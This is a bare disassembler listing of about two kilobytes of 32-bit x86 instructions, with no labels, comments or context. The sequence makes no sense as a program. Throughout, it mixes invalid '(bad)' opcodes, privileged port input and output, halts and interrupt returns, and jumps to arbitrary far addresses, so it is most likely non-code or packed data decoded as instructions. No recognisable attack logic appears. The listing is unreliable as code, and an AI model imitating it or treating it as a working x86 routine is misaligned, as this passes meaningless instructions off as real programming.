  417e46:	mov    al,ds:0x6d8a7e2
  417e4b:	cmp    eax,0x35765d4
  417e50:	retf   
  417e51:	mov    eax,0xc0a25d7c
  417e56:	dec    esp
  417e57:	sbb    eax,0x1aa53908
  417e5c:	lods   al,BYTE PTR ds:[esi]
  417e5d:	enter  0x18c4,0x2b
  417e61:	shl    esi,1
  417e63:	stos   BYTE PTR es:[edi],al
  417e64:	mov    dh,0xa7
  417e66:	(bad)  
  417e67:	fisub  DWORD PTR [ebx]
  417e69:	arpl   cx,sp
  417e6b:	and    DWORD PTR [eax+0x444ca743],esp
  417e71:	hlt    
  417e72:	in     al,0xf5
  417e74:	dec    edi
  417e75:	xor    BYTE PTR [ebx+ecx*4+0x26],bh
  417e79:	pop    ebx
  417e7a:	leave  
  417e7b:	iret   
  417e7c:	push   edx
  417e7d:	pushf  
  417e7e:	adc    al,0x6a
  417e80:	loopne 0x417e5a
  417e82:	call   0x20fd42f6
  417e87:	jnp    0x417e64
  417e89:	int3   
  417e8a:	and    BYTE PTR [eax-0x160732e0],0xc4
  417e91:	popa   
  417e92:	and    eax,0x478d8f53
  417e97:	adc    dh,bh
  417e99:	sbb    dl,BYTE PTR [edx+0x72d395d5]
  417e9f:	pop    ecx
  417ea0:	stos   BYTE PTR es:[edi],al
  417ea1:	jo     0x417ef1
  417ea3:	adc    eax,DWORD PTR [edi]
  417ea5:	dec    ebx
  417ea6:	sbb    edi,DWORD PTR [edx+0x74700557]
  417eac:	in     eax,dx
  417ead:	xchg   esi,eax
  417eae:	dec    ecx
  417eaf:	dec    esp
  417eb0:	or     DWORD PTR [esp+eax*8-0xc],ebp
  417eb4:	test   BYTE PTR [eax],al
  417eb6:	enter  0xf466,0xed
  417eba:	lea    esp,[ecx+0x1b148dbe]
  417ec0:	ds int 0x8
  417ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ec4:	fcos   
  417ec6:	jp     0x417edb
  417ec8:	mov    edx,0x14105cc8
  417ecd:	add    DWORD PTR [ebp+edi*8+0x3d],eax
  417ed1:	aam    0xe
  417ed3:	mov    ecx,0x95caa554
  417ed8:	jnp    0x417ecd
  417eda:	push   esp
  417edb:	push   edx
  417edc:	or     edx,DWORD PTR [edx-0x62e3a61a]
  417ee2:	imul   esp,DWORD PTR [edx+0x7d23132d],0xfffffffa
  417ee9:	ret    0x44a
  417eec:	fincstp 
  417eee:	sub    BYTE PTR cs:[ebp+0x65],0x27
  417ef3:	(bad)  
  417ef4:	aam    0x90
  417ef6:	mov    ah,0x63
  417ef8:	je     0x417eb7
  417efa:	inc    esi
  417efb:	repz mov edi,0x872261c2
  417f01:	idiv   cl
  417f03:	jmp    0x9c1a:0xd06b47c9
  417f0a:	popa   
  417f0b:	lods   eax,DWORD PTR ds:[esi]
  417f0c:	shl    BYTE PTR [esi*1-0x11b2d2b4],0x13
  417f14:	xor    edi,ecx
  417f16:	outs   dx,BYTE PTR ds:[esi]
  417f17:	aaa    
  417f18:	icebp  
  417f19:	push   cs
  417f1a:	push   0x53
  417f1c:	inc    esi
  417f1d:	retf   
  417f1e:	mov    bl,0x15
  417f20:	je     0x417f69
  417f22:	stos   DWORD PTR es:[edi],eax
  417f23:	cli    
  417f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f26:	aam    0x75
  417f28:	cld    
  417f29:	add    bl,BYTE PTR [eax-0x53abcba]
  417f2f:	or     BYTE PTR [edx-0x7d],bh
  417f32:	and    al,0x29
  417f34:	mov    esp,ss
  417f36:	push   ebx
  417f37:	imul   ecx,DWORD PTR [ecx],0xffffff8a
  417f3a:	xor    dl,0x7b
  417f3d:	mov    edx,0xcc9fd257
  417f42:	xor    al,0xf
  417f44:	xor    al,0x8e
  417f46:	rcl    DWORD PTR [esi],0x38
  417f49:	xchg   DWORD PTR [edi-0x50],edi
  417f4c:	call   0x8709:0x9751d4ec
  417f53:	jmp    0x417f28
  417f55:	popf   
  417f56:	sahf   
  417f57:	gs inc ecx
  417f59:	fs int3 
  417f5b:	sub    DWORD PTR [edx+0x6959a876],esi
  417f61:	les    ebp,FWORD PTR ds:0x70823dbb
  417f67:	aas    
  417f68:	pushf  
  417f69:	outs   dx,BYTE PTR ds:[esi]
  417f6a:	jno    0x417f5a
  417f6c:	jb     0x417f1c
  417f6e:	sbb    BYTE PTR [edx+0x7e8a46cc],cl
  417f74:	inc    ebx
  417f75:	int    0x3a
  417f77:	call   0xd77b656e
  417f7c:	js     0x417f4e
  417f7e:	lds    esp,FWORD PTR [edi]
  417f80:	cs repnz hlt 
  417f83:	dec    edx
  417f84:	cmp    BYTE PTR [ebx+eiz*4-0x61],0xd4
  417f89:	inc    eax
  417f8a:	lea    ebp,[edx-0x15]
  417f8d:	lods   eax,DWORD PTR ds:[esi]
  417f8e:	pop    ds
  417f8f:	int    0xbe
  417f91:	retf   
  417f92:	sub    al,0xea
  417f94:	leave  
  417f95:	mov    ah,BYTE PTR [ecx]
  417f97:	sahf   
  417f98:	in     eax,0x6a
  417f9a:	pop    eax
  417f9b:	lods   al,BYTE PTR ds:[esi]
  417f9c:	out    dx,al
  417f9d:	or     cl,BYTE PTR [ecx+0x41]
  417fa0:	ret    0xf30e
  417fa3:	fwait
  417fa4:	out    0x7f,al
  417fa6:	dec    edx
  417fa7:	or     ecx,DWORD PTR [ebp-0x7e0bebd6]
  417fad:	ret    0xb43f
  417fb0:	xor    DWORD PTR [eax-0x9064c14],edi
  417fb6:	lea    esp,[ebp-0x40]
  417fb9:	fst    st(5)
  417fbb:	in     al,0x96
  417fbd:	arpl   WORD PTR [edx],bx
  417fbf:	xchg   ebp,eax
  417fc0:	(bad)  
  417fc1:	and    eax,0xf80d4750
  417fc6:	daa    
  417fc7:	shr    DWORD PTR [edx],cl
  417fc9:	dec    edx
  417fca:	cmp    DWORD PTR [ecx+0x53],0xffffffc2
  417fce:	(bad)  
  417fcf:	pop    eax
  417fd0:	shl    ah,1
  417fd2:	cdq    
  417fd3:	je     0x41803e
  417fd5:	les    esi,FWORD PTR [ebx-0x7b2455bb]
  417fdb:	arpl   dx,cx
  417fdd:	cmp    DWORD PTR ds:[eax+0x5f],eax
  417fe1:	mov    edi,0x65f776bb
  417fe6:	xor    bl,BYTE PTR [esi-0xeb66bea]
  417fec:	xchg   ebx,eax
  417fed:	jg     0x417ff5
  417fef:	jge    0x418061
  417ff1:	fwait
  417ff2:	popa   
  417ff3:	xchg   edx,eax
  417ff4:	lock add ch,bl
  417ff7:	mov    ebx,0xb738f4be
  417ffc:	clc    
  417ffd:	pop    ebp
  417ffe:	popf   
  417fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418000:	repz mov bh,0xb8
  418003:	adc    eax,0xf48540f7
  418008:	pusha  
  418009:	push   0x485591b5
  41800e:	dec    ebp
  41800f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418010:	dec    esi
  418011:	cmp    bh,bh
  418013:	outs   dx,DWORD PTR ds:[esi]
  418014:	mov    ah,0xbf
  418016:	jbe    0x418068
  418018:	ins    BYTE PTR es:[edi],dx
  418019:	mov    dh,0x79
  41801b:	imul   esi,esp,0xd1097a1a
  418021:	ret    0x318c
  418024:	mov    BYTE PTR [esi+ecx*8+0x9],cl
  418028:	ret    0x7dd8
  41802b:	or     DWORD PTR [ecx+0x7789a2e6],0x38
  418032:	sub    al,0x89
  418034:	mov    esi,0x39d67934
  418039:	scas   al,BYTE PTR es:[edi]
  41803a:	mov    BYTE PTR ds:0x1d7cc6cf,dl
  418040:	add    BYTE PTR [ecx-0x5b1e1d97],0xa3
  418047:	xchg   esi,eax
  418048:	out    dx,eax
  418049:	sub    dh,0xb4
  41804c:	xchg   edx,eax
  41804d:	in     al,dx
  41804e:	mov    ebx,0x8ed4f50f
  418053:	add    BYTE PTR [ecx],0x67
  418056:	cmp    dh,BYTE PTR [esi]
  418058:	dec    ebp
  418059:	xchg   edi,eax
  41805a:	pushf  
  41805b:	es js  0x4180b9
  41805e:	mov    ecx,0x9113d0f6
  418063:	ret    
  418064:	xchg   ebp,eax
  418065:	sar    BYTE PTR [ebx],0x5e
  418068:	int3   
  418069:	sahf   
  41806a:	push   0x36
  41806c:	mov    dl,bl
  41806e:	sub    dl,ah
  418070:	jmp    0x7844:0xcf95f3a1
  418077:	in     al,dx
  418078:	cmp    ebp,DWORD PTR [edx-0x4e9b75e7]
  41807e:	mov    bl,0x79
  418080:	adc    bh,dh
  418082:	sub    esp,ecx
  418084:	dec    edi
  418085:	cmp    DWORD PTR [eax],esi
  418087:	stc    
  418088:	sub    al,0xf4
  41808a:	ss jg  0xaef98d9b
  418091:	ja     0x41804c
  418093:	or     DWORD PTR [esi+eiz*2],eax
  418096:	jno    0x418044
  418098:	add    dl,BYTE PTR [esi+0x65]
  41809b:	and    dl,BYTE PTR [ecx-0x5447fb36]
  4180a1:	xchg   edi,eax
  4180a2:	imul   ebx,DWORD PTR [ecx-0x54b23585],0xffffff8c
  4180a9:	dec    ebp
  4180aa:	push   0x3eca4894
  4180af:	std    
  4180b0:	retf   0x7f9a
  4180b3:	add    al,0xe6
  4180b5:	pop    esi
  4180b6:	sahf   
  4180b7:	mov    edx,0xde5d23b1
  4180bc:	and    ebx,edx
  4180be:	mov    al,ds:0xdc88a7de
  4180c3:	stos   BYTE PTR es:[edi],al
  4180c4:	je     0x418049
  4180c6:	call   FWORD PTR [ecx]
  4180c8:	stos   DWORD PTR es:[edi],eax
  4180c9:	dec    esp
  4180ca:	loope  0x418090
  4180cc:	sbb    eax,0x632db0d
  4180d1:	dec    edi
  4180d2:	ins    BYTE PTR es:[edi],dx
  4180d3:	xor    ebp,DWORD PTR [ecx+0x7c]
  4180d6:	cld    
  4180d7:	es dec ebx
  4180d9:	xchg   edx,eax
  4180da:	mov    edi,0xfaaa3a2d
  4180df:	sub    eax,0x39c346f3
  4180e4:	push   0xd618d1c6
  4180e9:	in     eax,0x3f
  4180eb:	arpl   bx,ax
  4180ed:	push   edi
  4180ee:	and    edx,eax
  4180f0:	rol    DWORD PTR [ebx+0x31],1
  4180f3:	enter  0x54ac,0x3c
  4180f7:	lds    edx,FWORD PTR [esi+0x74]
  4180fa:	jp     0x4180ac
  4180fc:	jae    0x4180e2
  4180fe:	lea    ecx,[ebx]
  418100:	out    0xc0,eax
  418102:	fidiv  DWORD PTR [edx-0x754c1c39]
  418108:	clc    
  418109:	mov    BYTE PTR [edi+esi*4-0x3f],bl
  41810d:	cmp    ebp,ecx
  41810f:	ret    0x6b44
  418112:	cmp    ebp,esi
  418114:	mov    al,0x28
  418116:	inc    ebx
  418117:	jmp    0xeea65559
  41811c:	es dec edx
  41811e:	arpl   WORD PTR [ecx],cx
  418120:	retf   0x4f32
  418123:	jmp    0x2b2c80d3
  418128:	hlt    
  418129:	out    dx,al
  41812a:	test   al,0xbc
  41812c:	mov    al,ds:0x50b988d4
  418131:	shr    DWORD PTR [edx+0x6945c63b],1
  418137:	leave  
  418138:	mov    bh,0x51
  41813a:	add    BYTE PTR [eax+0x7dfafdc0],al
  418140:	fild   WORD PTR [edi]
  418142:	xor    DWORD PTR [ebx-0x2ec82219],ebx
  418148:	push   edx
  418149:	rol    BYTE PTR [eax],0x23
  41814c:	ss cdq 
  41814e:	push   edx
  41814f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418150:	(bad)  
  418151:	mov    ebp,0xd09aa9a
  418156:	pop    edi
  418157:	aam    0xb2
  418159:	fisttp DWORD PTR [edi]
  41815b:	inc    ecx
  41815c:	or     eax,0x455c56a7
  418161:	retf   0x4c7a
  418164:	pop    ds
  418165:	pop    eax
  418166:	(bad)  
  418167:	xchg   esp,eax
  418168:	xor    al,0xc2
  41816a:	xor    eax,0xd8837b9f
  41816f:	xchg   edx,eax
  418170:	jmp    0x28da4753
  418175:	mov    edi,0x3026fe5d
  41817a:	imul   esi,DWORD PTR [esi-0x29a35563],0x67
  418181:	inc    edx
  418182:	jno    0x418193
  418184:	sbb    al,0xd4
  418186:	popf   
  418187:	xchg   edi,eax
  418188:	stos   DWORD PTR es:[edi],eax
  418189:	mov    dl,0x4f
  41818b:	jle    0x4181d5
  41818d:	push   eax
  41818e:	add    BYTE PTR [eax-0x68f17aa],0x1f
  418195:	and    ebx,esi
  418197:	(bad)  
  418198:	cmp    BYTE PTR [ecx],dl
  41819a:	imul   edx,DWORD PTR [ebx],0x31
  41819d:	cmc    
  41819e:	loopne 0x4181f9
  4181a0:	mov    bl,0xe3
  4181a2:	fs dec ebx
  4181a4:	add    BYTE PTR [esi],0x8
  4181a7:	bound  esp,QWORD PTR [ebp-0x1f]
  4181aa:	retf   0x3574
  4181ad:	ds dec ebp
  4181af:	lahf   
  4181b0:	sub    bl,BYTE PTR [edi+0x22]
  4181b3:	mov    ah,0xac
  4181b5:	sub    edi,DWORD PTR [edx-0x33d04030]
  4181bb:	repz sar BYTE PTR [edx+0x50cd6f22],0xba
  4181c3:	mov    ebx,0x14be1995
  4181c8:	mov    eax,0xafce707d
  4181cd:	push   cs
  4181ce:	in     al,0x95
  4181d0:	lds    edx,FWORD PTR [edi-0x4f]
  4181d3:	loopne 0x4181d6
  4181d5:	mov    edi,DWORD PTR [eax+0x24]
  4181d8:	cmp    ch,bh
  4181da:	bound  ecx,QWORD PTR [edx+0x2de875a5]
  4181e0:	ss pop ss
  4181e2:	bound  eax,QWORD PTR [ebx+0x24cf316c]
  4181e8:	pop    esi
  4181e9:	ds jno 0x4181ec
  4181ec:	in     eax,dx
  4181ed:	ds das 
  4181ef:	xchg   DWORD PTR [edi-0x74fc5339],ebp
  4181f5:	dec    esi
  4181f6:	std    
  4181f7:	loop   0x418216
  4181f9:	repnz loopne 0x4181db
  4181fc:	out    dx,eax
  4181fd:	movlps QWORD PTR [ebp-0x660d00a5],xmm5
  418204:	out    0x3d,al
  418206:	fdiv   QWORD PTR [edx+eiz*8]
  418209:	nop
  41820a:	and    eax,0x13f711fd
  41820f:	xchg   edx,eax
  418210:	or     DWORD PTR [ebx-0xb],ecx
  418213:	xchg   esi,eax
  418214:	inc    ebx
  418215:	pop    esp
  418216:	push   eax
  418217:	mov    eax,0x255cdfbd
  41821c:	xchg   ecx,eax
  41821d:	sub    eax,0xae9aafd1
  418222:	mov    ecx,0x87d5f8c3
  418227:	jo     0x4181d8
  418229:	ror    ah,1
  41822b:	lock fsub st(2),st
  41822e:	pop    ebp
  41822f:	aaa    
  418230:	gs cs loopne 0x41824a
  418234:	outs   dx,BYTE PTR ds:[esi]
  418235:	fsub   QWORD PTR [edx+0x59]
  418238:	dec    esp
  418239:	xchg   esp,eax
  41823a:	shl    eax,0x5a
  41823d:	iret   
  41823e:	retf   
  41823f:	dec    esi
  418240:	pop    edx
  418241:	imul   ebx,DWORD PTR [eax+0x12175c8e],0x6533b20c
  41824b:	in     eax,0x86
  41824d:	int3   
  41824e:	sub    al,0xae
  418250:	add    eax,ebx
  418252:	aad    0xe2
  418254:	add    eax,0xda60257b
  418259:	pop    ds
  41825a:	xor    ah,BYTE PTR [edi-0x34]
  41825d:	and    esp,ebp
  41825f:	fs inc ecx
  418261:	in     al,dx
  418262:	jb     0x418224
  418264:	into   
  418265:	je     0x4182b7
  418267:	fcmovnu st,st(0)
  418269:	scas   al,BYTE PTR es:[edi]
  41826a:	out    0xf9,eax
  41826c:	fwait
  41826d:	jo     0x4182a6
  41826f:	add    cl,BYTE PTR [esi+0x8]
  418272:	and    BYTE PTR [edi-0x60],cl
  418275:	push   ds
  418276:	xchg   bp,ax
  418278:	or     DWORD PTR [eax],ebx
  41827a:	fst    DWORD PTR [edx+0x53]
  41827d:	cmp    BYTE PTR [ecx+0x35],al
  418280:	jo     0x4182a2
  418282:	in     eax,dx
  418283:	je     0x41829b
  418285:	mov    WORD PTR [eax+ebp*1],fs
  418288:	sub    esi,DWORD PTR [edi]
  41828a:	pop    esp
  41828b:	(bad)  
  41828c:	loop   0x4182a0
  41828e:	xorps  xmm3,XMMWORD PTR [ecx]
  418291:	ret    0x7535
  418294:	cmp    bl,BYTE PTR [edi+0x7a5dd93a]
  41829a:	and    al,0x54
  41829c:	and    bl,BYTE PTR [ebp-0x7b0446ae]
  4182a2:	dec    edx
  4182a3:	mov    esi,0xf5cc73c1
  4182a8:	inc    ebp
  4182a9:	pop    esp
  4182aa:	sub    cl,BYTE PTR [edx]
  4182ac:	sbb    DWORD PTR [edi],edx
  4182ae:	ret    
  4182af:	xor    DWORD PTR [esi+0x1cbbbdd4],0xf7d2a363
  4182b9:	or     BYTE PTR [edi+0x26],ch
  4182bc:	mov    ds:0x1483b539,eax
  4182c1:	add    edx,esp
  4182c3:	les    esp,FWORD PTR [ebp+0x2b]
  4182c6:	inc    ebp
  4182c7:	xchg   ebp,eax
  4182c8:	xor    esp,DWORD PTR [ebp-0x2b4edd0]
  4182ce:	adc    BYTE PTR [ebx+0x73938c35],bh
  4182d4:	out    0x54,al
  4182d6:	test   BYTE PTR [ebx],dh
  4182d8:	fisub  DWORD PTR [edx+0x2d90bc63]
  4182de:	rol    ebx,0xf9
  4182e1:	cwde   
  4182e2:	jo     0x418284
  4182e4:	ret    0x78fd
  4182e7:	pop    ecx
  4182e8:	jbe    0x4182ce
  4182ea:	adc    ecx,DWORD PTR [edx-0x70078eb3]
  4182f0:	mov    ebp,0xe948ed54
  4182f5:	or     BYTE PTR [ecx-0x36bdb49b],0x8
  4182fc:	scas   al,BYTE PTR es:[edi]
  4182fd:	test   BYTE PTR [ebx-0x73],0xe2
  418301:	mul    DWORD PTR [eax+0x2adc88f3]
  418307:	pop    edi
  418308:	xchg   edx,eax
  418309:	jp     0x4182e9
  41830b:	push   eax
  41830c:	imul   eax,DWORD PTR [edi-0x8],0x825f99d
  418313:	mov    al,BYTE PTR [edx+0x504537fb]
  418319:	cs dec esi
  41831b:	inc    eax
  41831c:	outs   dx,DWORD PTR ds:[esi]
  41831d:	add    al,BYTE PTR [edx]
  41831f:	ds jbe 0x418387
  418322:	mov    ch,0xae
  418324:	sti    
  418325:	mov    sp,WORD PTR [ebp+0x73f1f35]
  41832c:	add    BYTE PTR [ebx+edi*4-0x9],bl
  418330:	in     al,0x6e
  418332:	cmc    
  418333:	jl     0x418336
  418335:	gs jmp 0xff49:0x7fdd249f
  41833d:	test   eax,0xb20f04fd
  418342:	mov    eax,ds:0xa089c792
  418347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418348:	(bad)  
  418349:	hlt    
  41834a:	shl    BYTE PTR [eax+ecx*2-0x20290658],cl
  418351:	mov    edx,es
  418353:	cmp    BYTE PTR [edi-0x74b27291],bl
  418359:	mov    ecx,DWORD PTR [eax+esi*1]
  41835c:	leave  
  41835d:	shr    bl,cl
  41835f:	aaa    
  418360:	es out 0xcf,al
  418363:	pop    edi
  418364:	in     eax,0xfe
  418366:	enter  0xa9b2,0xbf
  41836a:	mov    ah,0xc5
  41836c:	gs push ds
  41836e:	mov    al,0x83
  418370:	cmp    eax,0x1c9f970e
  418375:	push   ecx
  418376:	cmp    al,dh
  418378:	xchg   edx,eax
  418379:	mov    al,0x6
  41837b:	mov    bh,0x3c
  41837d:	push   ecx
  41837e:	pinsrw mm6,ebx,0xe8
  418382:	dec    edx
  418383:	loope  0x4183cb
  418385:	fwait
  418386:	cmp    eax,0x185a5253
  41838b:	push   esp
  41838c:	push   ecx
  41838d:	pop    es
  41838e:	cwde   
  41838f:	add    ah,cl
  418391:	cmc    
  418392:	jle    0x41836f
  418394:	dec    ecx
  418395:	retf   0xd82f
  418398:	mov    BYTE PTR [ebp-0x51],bh
  41839b:	test   BYTE PTR [esi],dh
  41839d:	jnp    0x418344
  41839f:	push   ecx
  4183a0:	arpl   WORD PTR [eax+0x50],cx
  4183a3:	(bad)  
  4183a4:	out    0xbf,al
  4183a6:	test   eax,0x4fe6a683
  4183ab:	xchg   esp,eax
  4183ac:	jb     0x41834c
  4183ae:	(bad)  [esp+ecx*8+0x3aa09b0a]
  4183b5:	xor    DWORD PTR cs:[ebx],esi
  4183b8:	mov    edi,0x46c17879
  4183bd:	retf   
  4183be:	pop    eax
  4183bf:	and    eax,0xa4236db1
  4183c4:	mov    al,0x2c
  4183c6:	mov    ds:0x545a0a46,eax
  4183cb:	mov    esi,0xbfdb5bee
  4183d0:	arpl   cx,bx
  4183d2:	sbb    al,0x58
  4183d4:	sahf   
  4183d5:	cmp    ah,BYTE PTR [ebx+0x19]
  4183d8:	cmp    al,0x65
  4183da:	cdq    
  4183db:	push   ecx
  4183dc:	cmp    ecx,DWORD PTR [ebp-0x9]
  4183df:	jbe    0x4183f4
  4183e1:	imul   edx,DWORD PTR [esi-0x760efb2],0xffffffbf
  4183e8:	mov    ds:0x84c4a9e4,eax
  4183ed:	xchg   edx,eax
  4183ee:	shl    DWORD PTR [edi],cl
  4183f0:	neg    edx
  4183f2:	jnp    0x41840f
  4183f4:	dec    esp
  4183f5:	add    BYTE PTR [eax+eax*8+0x77],al
  4183f9:	js     0x4183f2
  4183fb:	and    al,0x21
  4183fd:	adc    al,0x95
  4183ff:	cmc    
  418400:	sbb    DWORD PTR cs:[eax],ecx
  418403:	hlt    
  418404:	dec    ecx
  418405:	and    dh,BYTE PTR [edx-0x69]
  418408:	jmp    0x4183ef
  41840a:	xchg   ecx,eax
  41840b:	jg     0x41845e
  41840d:	aad    0xa9
  41840f:	mov    al,0x1b
  418411:	mov    al,ds:0xb581099d
  418416:	pop    ebx
  418417:	leave  
  418418:	xchg   DWORD PTR [ebx+0x1],ebp
  41841b:	pop    ecx
  41841c:	xchg   DWORD PTR [eax+0x5a],ebx
  41841f:	xor    BYTE PTR [esi-0x12],0xb6
  418423:	outs   dx,BYTE PTR ds:[esi]
  418424:	ins    BYTE PTR es:[edi],dx
  418425:	mov    ebx,0x67d43725
  41842a:	cmp    al,0xab
  41842c:	push   0xffffffb4
  41842e:	xor    al,0xd2
  418430:	and    BYTE PTR [ebp+0x6a25ae77],0x67
  418437:	iret   
  418438:	out    0x8d,al
  41843a:	sbb    eax,0x3bacb35f
  41843f:	fmul   QWORD PTR [edx+eiz*4-0xebd84e2]
  418446:	in     eax,dx
  418447:	inc    edi
  418448:	mov    ds:0x77786008,al
  41844d:	stos   DWORD PTR es:[edi],eax
  41844e:	cs cmp BYTE PTR ds:0xe3fdc703,bl
  418456:	int3   
  418457:	push   edx
  418458:	lods   eax,DWORD PTR ds:[esi]
  418459:	jge    0x41849c
  41845b:	pop    eax
  41845c:	mov    bl,0x1b
  41845e:	sbb    BYTE PTR [edx+0x29],cl
  418461:	cmp    eax,0x9335621
  418466:	sbb    eax,0xabd716d2
  41846b:	ja     0x418474
  41846d:	imul   ebx,DWORD PTR [ebx+0x396d813b],0x4c
  418474:	or     esp,ebp
  418476:	arpl   WORD PTR [ebp+0x68c6f278],si
  41847c:	fsubr  DWORD PTR [ebx]
  41847e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41847f:	and    ebp,esi
  418481:	pop    edx
  418482:	pop    edi
  418483:	or     bh,dh
  418485:	js     0x41847b
  418487:	into   
  418488:	push   ss
  418489:	mov    ebx,0xcf933aa6
  41848e:	lods   al,BYTE PTR ds:[esi]
  41848f:	adc    dh,ah
  418491:	or     eax,0x805b1b49
  418496:	adc    DWORD PTR [eax-0x79bab641],edx
  41849c:	adc    BYTE PTR [esi-0x42],bh
  41849f:	adc    eax,0x6c56d1a2
  4184a4:	add    esp,DWORD PTR [edi+0x3c6df518]
  4184aa:	mov    DWORD PTR [ebp*8-0x5d900945],0xf39e20d5
  4184b5:	or     dl,bh
  4184b7:	fild   QWORD PTR [ebp-0x57d676be]
  4184bd:	sar    BYTE PTR [ebp-0x63464e0],1
  4184c3:	pop    ebx
  4184c4:	sti    
  4184c5:	leave  
  4184c6:	cmp    al,0xa1
  4184c8:	adc    eax,ebp
  4184ca:	sahf   
  4184cb:	(bad)  
  4184cc:	push   eax
  4184cd:	pop    ecx
  4184ce:	fsubr  QWORD PTR [ecx]
  4184d0:	push   ecx
  4184d1:	es push cs
  4184d3:	xchg   BYTE PTR [ecx-0x18],bl
  4184d6:	inc    ebp
  4184d7:	jmp    0x418535
  4184d9:	fwait
  4184da:	jns    0x418556
  4184dc:	das    
  4184dd:	add    ebx,DWORD PTR [eax-0x62]
  4184e0:	jecxz  0x41850e
  4184e2:	mov    bh,0x23
  4184e4:	xor    eax,0x822f9411
  4184e9:	icebp  
  4184ea:	fidivr WORD PTR [edx]
  4184ec:	aaa    
  4184ed:	and    dl,BYTE PTR [edx+0x2d]
  4184f0:	pop    esi
  4184f1:	(bad)  
  4184f2:	lds    ebx,FWORD PTR [esp+esi*4-0x590a3bb]
  4184f9:	cmp    esi,esi
  4184fb:	pop    edi
  4184fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184fd:	dec    ecx
  4184fe:	dec    ebp
  4184ff:	mov    edi,0x27fa2366
  418504:	(bad)  
  418505:	jb     0x4184c6
  418507:	or     BYTE PTR [edx+0x5fa62d53],al
  41850d:	dec    ebp
  41850e:	push   ebx
  41850f:	hlt    
  418510:	gs pop ebx
  418512:	pop    ds
  418513:	pop    ebx
  418514:	add    eax,0x831a2721
  418519:	adc    BYTE PTR [edi+esi*8],dl
  41851c:	out    0xc7,eax
  41851e:	jle    0x418546
  418520:	popf   
  418521:	pop    ebx
  418522:	xor    dl,BYTE PTR [edi+edx*8+0x7486c39f]
  418529:	cmp    ebp,DWORD PTR [ecx+0x32]
  41852c:	cmp    edi,DWORD PTR [edi+0x5]
  41852f:	js     0x418520
  418531:	fucomi st,st(6)
  418533:	mov    ebx,0xe75e1a4e
  418538:	pop    es
  418539:	xchg   BYTE PTR ds:0x49d97b70,bl
  41853f:	jno    0x418551
  418541:	inc    esi
  418542:	inc    edx
  418543:	lea    edx,[edi]
  418545:	sbb    ecx,edi
  418547:	test   al,0xe
  418549:	out    dx,al
  41854a:	clc    
  41854b:	dec    esi
  41854c:	aad    0xb
  41854e:	mov    eax,ds:0x291cff3b
  418553:	in     al,0x8a
  418555:	std    
  418556:	call   0xc9be45b2
  41855b:	scas   al,BYTE PTR es:[edi]
  41855c:	xchg   ebx,eax
  41855d:	xor    DWORD PTR [ebx-0x751fa431],edx
  418563:	(bad)  
  418564:	out    0x15,eax
  418566:	jnp    0x418558
  418568:	inc    esi
  418569:	hlt    
  41856a:	aad    0x1
  41856c:	inc    esp
  41856d:	mov    ch,0x78
  41856f:	in     al,dx
  418570:	loope  0x418504
  418572:	push   edi
  418573:	outs   dx,BYTE PTR ds:[esi]
  418574:	cmc    
  418575:	rcl    BYTE PTR [eax-0x390519b0],1
  41857b:	nop
  41857c:	jae    0x418595
  41857e:	hlt    
  41857f:	xor    eax,0x8abe4066
  418584:	sbb    bl,BYTE PTR [ebx+0x1a43b381]
  41858a:	dec    edx
  41858b:	inc    eax
  41858c:	inc    ebp
  41858d:	jmp    0x4185e9
  41858f:	int3   
  418590:	adc    esi,DWORD PTR [edx+0x4]
  418593:	or     DWORD PTR [ebx-0x26],ebx
  418596:	icebp  
  418597:	adc    bl,dl
  418599:	dec    ebx
  41859a:	es dec eax
  41859c:	jmp    0x4b8a8420
  4185a1:	sub    dl,BYTE PTR [esi+0x17]
  4185a4:	jnp    0x418621
  4185a6:	sbb    bh,BYTE PTR [esi+0x75]
  4185a9:	shl    BYTE PTR ds:0xa72fd48a,0xb
  4185b0:	and    dh,BYTE PTR [edi+ebp*1+0x28]
  4185b4:	test   ah,dh
  4185b6:	int3   
  4185b7:	xchg   edx,eax
  4185b8:	scas   al,BYTE PTR es:[edi]
  4185b9:	jge    0x4185b1
  4185bb:	mov    ds:0x35cc626d,eax
  4185c0:	inc    eax
  4185c1:	ins    BYTE PTR es:[edi],dx
  4185c2:	test   ecx,ebx
  4185c4:	jp     0x4185c2
  4185c6:	jmp    0x4185b6
  4185c8:	cmp    dh,al
  4185ca:	dec    eax
  4185cb:	push   eax
  4185cc:	leave  
  4185cd:	inc    ebx
  4185ce:	push   esi
  4185cf:	les    ecx,FWORD PTR [ebx]
  4185d1:	mov    bl,0xec
  4185d3:	fwait
  4185d4:	add    eax,0x4556aea
  4185d9:	lock in eax,dx
  4185db:	int    0x4f
  4185dd:	push   esp
  4185de:	jo     0x4185fc
  4185e0:	pop    ecx
  4185e1:	inc    edi
  4185e2:	mov    bh,0xe4
  4185e4:	jbe    0x418591
  4185e6:	mov    ebx,DWORD PTR [ecx-0x15de8fc]
  4185ec:	sahf   
  4185ed:	jle    0x4185dd
  4185ef:	mov    ebp,0x60e6e4db
  4185f4:	es inc eax
  4185f6:	adc    al,0xa
  4185f8:	ret    0xe4e7
  4185fb:	hlt    
  4185fc:	fst    st(2)
  4185fe:	adc    ch,0xfe
  418601:	lea    esp,[ecx-0x1017fc32]
  418607:	push   cs
  418608:	call   DWORD PTR [edi+0x42b976d0]
  41860e:	jne    0x4185ce
  418610:	adc    dh,bh
  418612:	mov    al,0x0
  418614:	sbb    ch,BYTE PTR [ecx-0x20]
  418617:	lahf   
  418618:	sbb    eax,0x31f3750e
  41861d:	mul    BYTE PTR [edx]
  41861f:	inc    eax
  418620:	sar    DWORD PTR [ecx],1
  418622:	(bad)  
  418623:	and    BYTE PTR [ecx],cl
  418625:	(bad)  
  418626:	fild   WORD PTR [edx+0x1a]
  418629:	in     eax,dx
  41862a:	cmp    BYTE PTR [ecx+0x24bec4d1],cl
  418630:	pop    ebx
  418631:	lods   eax,DWORD PTR ds:[esi]
  418632:	cmp    DWORD PTR [edx-0x25740aeb],edx
  418638:	(bad)  
  418639:	and    DWORD PTR [esi+0x3f],eax
